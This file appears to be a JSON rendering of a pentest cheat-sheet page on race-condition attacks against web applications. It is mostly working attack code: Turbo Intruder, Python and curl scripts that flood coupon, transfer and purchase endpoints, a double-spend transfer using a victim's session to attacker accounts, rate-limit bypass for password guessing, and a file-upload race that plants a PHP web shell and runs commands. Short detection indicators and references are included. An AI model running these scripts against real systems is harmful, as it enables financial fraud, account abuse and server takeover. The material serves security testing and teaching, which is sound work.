@@ -1,0 +1,420 @@
+{
+    "title": "Race Conditions",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Concepts",
+            "subheadings": [
+                {
+                    "heading": "Time-of-Check to Time-of-Use (TOCTOU)",
+                    "type": "code_block",
+                    "content": [
+                        "Normal flow:",
+                        "1. Check: Is user balance >= $100?",
+                        "2. Use: Deduct $100 from balance",
+                        "",
+                        "Attack:",
+                        "1. Send 10 parallel requests to buy $100 item",
+                        "2. All checks happen before any deductions",
+                        "3. All 10 purchases succeed with only $100 balance"
+                    ]
+                },
+                {
+                    "heading": "Common Vulnerable Operations",
+                    "type": "table",
+                    "headers": [
+                        "Operation",
+                        "Attack Goal"
+                    ],
+                    "rows": [
+                        {
+                            "Operation": "Money transfers",
+                            "Attack Goal": "Double-spend, overdraft"
+                        },
+                        {
+                            "Operation": "Coupon/voucher redemption",
+                            "Attack Goal": "Multiple use of single-use code"
+                        },
+                        {
+                            "Operation": "Rate limiting",
+                            "Attack Goal": "Bypass request limits"
+                        },
+                        {
+                            "Operation": "File upload",
+                            "Attack Goal": "Overwrite during processing"
+                        },
+                        {
+                            "Operation": "Inventory/stock",
+                            "Attack Goal": "Purchase more than available"
+                        },
+                        {
+                            "Operation": "Vote/like systems",
+                            "Attack Goal": "Multiple votes"
+                        },
+                        {
+                            "Operation": "Account creation",
+                            "Attack Goal": "Duplicate accounts"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Testing Tools",
+            "subheadings": [
+                {
+                    "heading": "Turbo Intruder (Burp Suite)",
+                    "type": "code_block",
+                    "content": [
+                        "# Basic race condition script",
+                        "def queueRequests(target, wordlists):",
+                        "    engine = RequestEngine(endpoint=target.endpoint,",
+                        "                          concurrentConnections=30,",
+                        "                          requestsPerConnection=100,",
+                        "                          pipeline=True)",
+                        "    ",
+                        "    # Queue same request multiple times",
+                        "    for i in range(30):",
+                        "        engine.queue(target.req)",
+                        "",
+                        "def handleResponse(req, interesting):",
+                        "    table.add(req)",
+                        "# Single-packet attack (most effective)",
+                        "def queueRequests(target, wordlists):",
+                        "    engine = RequestEngine(endpoint=target.endpoint,",
+                        "                          concurrentConnections=1,",
+                        "                          requestsPerConnection=100,",
+                        "                          pipeline=False)",
+                        "    ",
+                        "    # Send all requests in single TCP packet",
+                        "    for i in range(20):",
+                        "        engine.queue(target.req, gate='race1')",
+                        "    ",
+                        "    # Release all at once",
+                        "    engine.openGate('race1')"
+                    ]
+                },
+                {
+                    "heading": "race-the-web",
+                    "type": "code_block",
+                    "content": [
+                        "# https://github.com/TheHackerDev/race-the-web",
+                        "# Configure in config.toml",
+                        "",
+                        "[[targets]]",
+                        "method = \"POST\"",
+                        "url = \"https://target.com/api/transfer\"",
+                        "body = '{\"amount\": 100, \"to\": \"attacker\"}'",
+                        "cookies = \"session=abc123\"",
+                        "count = 100",
+                        "",
+                        "# Run",
+                        "race-the-web config.toml"
+                    ]
+                },
+                {
+                    "heading": "Custom Python Script",
+                    "type": "code_block",
+                    "content": [
+                        "import asyncio",
+                        "import aiohttp",
+                        "",
+                        "async def send_request(session, url, data, headers):",
+                        "    async with session.post(url, data=data, headers=headers) as response:",
+                        "        return await response.text()",
+                        "",
+                        "async def race_condition_test(url, data, headers, count=50):",
+                        "    async with aiohttp.ClientSession() as session:",
+                        "        tasks = [send_request(session, url, data, headers) for _ in range(count)]",
+                        "        responses = await asyncio.gather(*tasks)",
+                        "        return responses",
+                        "",
+                        "# Run",
+                        "url = \"https://target.com/api/redeem\"",
+                        "data = {\"code\": \"DISCOUNT50\"}",
+                        "headers = {\"Cookie\": \"session=abc123\", \"Content-Type\": \"application/json\"}",
+                        "",
+                        "responses = asyncio.run(race_condition_test(url, data, headers, 100))",
+                        "print(f\"Success count: {responses.count('success')}\")"
+                    ]
+                },
+                {
+                    "heading": "curl Parallel Requests",
+                    "type": "code_block",
+                    "content": [
+                        "# Using GNU Parallel",
+                        "seq 1 50 | parallel -j 50 \"curl -s -X POST 'https://target.com/redeem' \\",
+                        "  -H 'Cookie: session=abc123' \\",
+                        "  -d 'code=SINGLE-USE'\"",
+                        "",
+                        "# Using xargs",
+                        "printf 'https://target.com/redeem\\n%.0s' {1..50} | \\",
+                        "  xargs -P 50 -I {} curl -s -X POST {} -H 'Cookie: session=abc123'",
+                        "",
+                        "# Using bash backgrounding",
+                        "for i in {1..50}; do",
+                        "  curl -s -X POST \"https://target.com/redeem\" \\",
+                        "    -H \"Cookie: session=abc123\" \\",
+                        "    -d \"code=DISCOUNT\" &",
+                        "done",
+                        "wait"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Attack Scenarios",
+            "subheadings": [
+                {
+                    "heading": "Coupon/Discount Code Abuse",
+                    "type": "code_block",
+                    "content": [
+                        "POST /api/apply-coupon HTTP/1.1",
+                        "Host: target.com",
+                        "Cookie: session=abc123",
+                        "Content-Type: application/json",
+                        "",
+                        "{\"coupon\": \"50OFF\", \"cart_id\": \"12345\"}",
+                        "# Turbo Intruder - apply coupon multiple times",
+                        "def queueRequests(target, wordlists):",
+                        "    engine = RequestEngine(endpoint=target.endpoint,",
+                        "                          concurrentConnections=20,",
+                        "                          requestsPerConnection=1,",
+                        "                          pipeline=False)",
+                        "    ",
+                        "    for i in range(20):",
+                        "        engine.queue(target.req, gate='race')",
+                        "    ",
+                        "    engine.openGate('race')"
+                    ]
+                },
+                {
+                    "heading": "Money Transfer Double-Spend",
+                    "type": "code_block",
+                    "content": [
+                        "# Transfer same funds to multiple accounts simultaneously",
+                        "import threading",
+                        "import requests",
+                        "",
+                        "def transfer(to_account):",
+                        "    requests.post(\"https://bank.com/transfer\", ",
+                        "                  data={\"to\": to_account, \"amount\": 1000},",
+                        "                  cookies={\"session\": \"victim_session\"})",
+                        "",
+                        "threads = []",
+                        "for account in [\"attacker1\", \"attacker2\", \"attacker3\"]:",
+                        "    t = threading.Thread(target=transfer, args=(account,))",
+                        "    threads.append(t)",
+                        "",
+                        "# Start all threads simultaneously",
+                        "for t in threads:",
+                        "    t.start()"
+                    ]
+                },
+                {
+                    "heading": "Rate Limit Bypass",
+                    "type": "code_block",
+                    "content": [
+                        "# Send many requests before rate limit kicks in",
+                        "# All arrive within same time window",
+                        "for i in {1..100}; do",
+                        "  curl -s \"https://target.com/api/check-password?password=attempt$i\" &",
+                        "done",
+                        "wait"
+                    ]
+                },
+                {
+                    "heading": "File Upload Race",
+                    "type": "code_block",
+                    "content": [
+                        "# Upload file and access before validation deletes it",
+                        "import threading",
+                        "import requests",
+                        "",
+                        "def upload():",
+                        "    files = {'file': ('shell.php', '<?php system($_GET[\"cmd\"]); ?>')}",
+                        "    requests.post(\"https://target.com/upload\", files=files)",
+                        "",
+                        "def access():",
+                        "    for _ in range(100):",
+                        "        r = requests.get(\"https://target.com/uploads/shell.php?cmd=id\")",
+                        "        if \"uid=\" in r.text:",
+                        "            print(\"SUCCESS:\", r.text)",
+                        "            break",
+                        "",
+                        "# Run simultaneously",
+                        "t1 = threading.Thread(target=upload)",
+                        "t2 = threading.Thread(target=access)",
+                        "t1.start()",
+                        "t2.start()"
+                    ]
+                },
+                {
+                    "heading": "Inventory/Stock Manipulation",
+                    "type": "code_block",
+                    "content": [
+                        "POST /api/purchase HTTP/1.1",
+                        "Host: store.com",
+                        "Cookie: session=abc123",
+                        "",
+                        "{\"item_id\": 1, \"quantity\": 1}",
+                        "Scenario: Only 1 item in stock",
+                        "1. Send 10 parallel purchase requests",
+                        "2. All check \"is stock >= 1?\" before any decrement",
+                        "3. Multiple purchases succeed"
+                    ]
+                },
+                {
+                    "heading": "OAuth State Race",
+                    "type": "code_block",
+                    "content": [
+                        "1. Initiate OAuth flow, get state token",
+                        "2. Send multiple parallel callbacks with same state",
+                        "3. State may be accepted multiple times",
+                        "4. Link multiple attacker accounts to victim's OAuth"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Detection Indicators",
+            "type": "code_block",
+            "content": [
+                "Signs of vulnerability:",
+                "- Operations involving balance/inventory checks",
+                "- Single-use tokens/codes",
+                "- Any \"check then act\" pattern",
+                "- Lack of database transactions",
+                "- Missing row-level locking",
+                "",
+                "Signs during testing:",
+                "- Inconsistent results with parallel requests",
+                "- Balance going negative",
+                "- Stock going negative",
+                "- Multiple redemptions of single-use items"
+            ]
+        },
+        {
+            "heading": "Advanced Techniques",
+            "subheadings": [
+                {
+                    "heading": "Single Packet Attack",
+                    "type": "code_block",
+                    "content": [
+                        "# Most effective - all requests in one TCP packet",
+                        "# Turbo Intruder with HTTP/2 single-packet mode",
+                        "",
+                        "def queueRequests(target, wordlists):",
+                        "    engine = RequestEngine(endpoint=target.endpoint,",
+                        "                          concurrentConnections=1,",
+                        "                          engine=Engine.BURP2)",
+                        "    ",
+                        "    # Queue requests",
+                        "    for i in range(20):",
+                        "        engine.queue(target.req, gate='race')",
+                        "    ",
+                        "    # Sync release - all in single packet",
+                        "    engine.openGate('race')"
+                    ]
+                },
+                {
+                    "heading": "Last-Byte Synchronization",
+                    "type": "code_block",
+                    "content": [
+                        "1. Send all requests except last byte",
+                        "2. Server holds connections waiting",
+                        "3. Send all final bytes simultaneously",
+                        "4. Requests processed at same instant"
+                    ]
+                },
+                {
+                    "heading": "HTTP/2 Multiplexing",
+                    "type": "code_block",
+                    "content": [
+                        "# Use HTTP/2 to send multiple requests on single connection",
+                        "# All frames arrive together, processed together",
+                        "",
+                        "import httpx",
+                        "",
+                        "async def h2_race():",
+                        "    async with httpx.AsyncClient(http2=True) as client:",
+                        "        tasks = [client.post(\"https://target.com/api/action\") for _ in range(20)]",
+                        "        responses = await asyncio.gather(*tasks)"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Tools & Resources",
+            "type": "code_block",
+            "content": [
+                "# Turbo Intruder (Burp Extension)",
+                "# Best for race conditions",
+                "",
+                "# race-the-web",
+                "https://github.com/TheHackerDev/race-the-web",
+                "",
+                "# racepwn",
+                "https://github.com/AhmedMohamedDev/racepwn",
+                "",
+                "# Burp Suite timing features",
+                "# Repeater → Send group in parallel",
+                "",
+                "# References",
+                "https://portswigger.net/research/smashing-the-state-machine"
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "list",
+            "content": [
+                "IDOR - Often chains with race conditions",
+                "API Security - APIs commonly vulnerable",
+                "Authentication Bypass - Rate limit bypass"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/race-conditions.md",
+        "previous_page": {
+            "title": "Supply Chain Attacks",
+            "url": "/enumeration/web/supply-chain"
+        },
+        "next_page": {
+            "title": "GraphQL Deep Dive",
+            "url": "/enumeration/web/graphql-deep"
+        }
+    }
+}
